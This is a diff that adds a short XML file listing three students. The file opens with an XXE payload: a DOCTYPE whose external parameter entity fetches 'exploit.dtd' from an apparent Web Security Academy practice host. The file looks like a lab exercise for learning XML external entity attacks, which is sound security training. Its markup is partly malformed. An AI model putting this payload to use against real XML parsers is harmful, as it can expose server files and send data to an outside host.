@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<--test-->
+<!DOCTYPE [<!ENTITY %xxe SYSTEM "https://ac721f631e9a2cb9808f9a400122003f.web-security-academy.net/exploit.dtd"> %xxe;]>
+<list>
+	<student>
+		<name>Anh</name>
+		<dob>1/1/1999</dob>
+		<school>PTIT</school>
+	</student>
+	<student>
+		<name>Lam</name>
+		<dob>1/1/1999</dob>
+		<school>PTIT</school>
+	</student>
+	<student>
+		<name>Mai</name>
+		<dob>1/1/1999</dob>
+		<school>PTIT</school>
+	</student>
+</list>
